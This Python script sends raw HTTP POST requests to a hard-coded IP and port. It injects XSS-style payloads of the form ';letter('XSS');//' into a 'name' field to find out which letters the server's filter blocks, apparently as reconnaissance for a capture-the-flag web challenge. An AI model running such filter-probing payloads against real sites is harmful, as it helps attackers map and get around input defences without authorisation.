import socket
import time

print("Testing character filter using direct socket communication")
print("=" * 70)

host = "94.237.49.241"
port = 4200
letters_to_test = ['p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

# Results tracking
blocked_chars = []
allowed_chars = []
failed_tests = []

for i, letter in enumerate(letters_to_test):
    payload_data = f"name=;{letter}('XSS');//"
    
    print(f"\nTesting letter: '{letter}' ({i+1}/{len(letters_to_test)})")
    print(f"Payload: {payload_data}")
    
    try:
        # Create socket and set timeout
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(45)  # 45 second timeout for full HTTP operation
        
        start_time = time.time()
        
        # Connect
        sock.connect((host, port))
        
        # Build HTTP POST request
        http_request = f"""POST /page HTTP/1.1\r\nHost: {host}:{port}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(payload_data)}\r\nConnection: close\r\n\r\n{payload_data}"""
        
        # Send request
        sock.sendall(http_request.encode('utf-8'))
        
        # Receive response (with timeout handling)
        response = b""
        sock.settimeout(45)  # Long timeout for response
        
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                print(f"  [WARNING] Partial response after timeout")
                break
        
        sock.close()
        elapsed = time.time() - start_time
        
        if response:
            # Decode response
            response_text = response.decode('utf-8', errors='ignore')
            
            print(f"  Response received in {elapsed:.2f}s")
            
            # Extract status code
            first_line = response_text.split('\n')[0]
            print(f"  First line: {first_line.strip()}")
            
            # Check for blocked pattern
            blocked_pattern = f"Sorry you can't use: '{letter}'"
            
            if blocked_pattern in response_text:
                print(f"  [BLOCKED] Character '{letter}' is blocked!")
                print(f"  Pattern found: '{blocked_pattern}'")
                blocked_chars.append(letter)
                
                # Show relevant line
                for line in response_text.split('\n'):
                    if blocked_pattern in line:
                        print(f"  Line: {line.strip()}")
                        break
            else:
                print(f"  [ALLOWED] Character '{letter}' is NOT blocked")
                allowed_chars.append(letter)
                
                # Show response snippet if interesting
                if "Hello" in response_text or "XSS" in response_text or "alert" in response_text:
                    print(f"  Response contains execution indicators")
                    # Find and print relevant line
                    for line in response_text.split('\n'):
                        if any(term in line for term in ['Hello', 'XSS', 'alert']):
                            print(f"  Line: {line.strip()}")
                else:
                    # Show a small snippet
                    lines = [l for l in response_text.split('\n') if l.strip()][:3]
                    if lines:
                        print(f"  Response preview:")
                        for line in lines:
                            if line.strip():
                                print(f"    {line.strip()}")
        else:
            print(f"  [ERROR] No response received")
            failed_tests.append(letter)
        
    except socket.timeout:
        print(f"  [TIMEOUT] Connection timed out after 45s")
        failed_tests.append(letter)
    except Exception as e:
        print(f"  [ERROR] {str(e)}")
        failed_tests.append(letter)

# Summary
print("\n" + "=" * 70)
print("CHARACTER FILTER TEST RESULTS")
print("=" * 70)
print(f"Blocked characters ({len(blocked_chars)}): {blocked_chars if blocked_chars else 'None found'}")
print(f"Allowed characters ({len(allowed_chars)}): {allowed_chars if allowed_chars else 'None found'}")
print(f"Failed tests ({len(failed_tests)}): {failed_tests if failed_tests else 'None'}")
print("\nTest completed.")

# Check if we should retry failed tests
if failed_tests:
    print(f"\nNote: {len(failed_tests)} tests timed out or failed. Consider retrying these:")
    print(f"Failed letters: {failed_tests}")
